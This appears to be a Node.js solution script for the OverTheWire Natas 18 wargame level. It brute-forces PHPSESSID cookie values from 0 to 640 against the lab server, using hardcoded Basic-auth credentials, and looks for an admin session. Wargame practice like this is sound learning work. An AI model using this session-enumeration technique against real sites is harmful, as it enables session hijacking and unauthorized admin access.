const got = require('got');

const sessionIds = [...Array(641).keys()]; // there are 640
sessionIds.forEach( (sessionId) => {
  got.get('http://natas18.natas.labs.overthewire.org/index.php?debug', {
    headers: {
      'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
      'Cookie': `PHPSESSID=${sessionId}`}}).then(resp => 
      {
        if (resp.body.includes('You are an admin')) {
          console.log(`sessionId: ${sessionId} + ${resp.body}`);
        }
      });
});
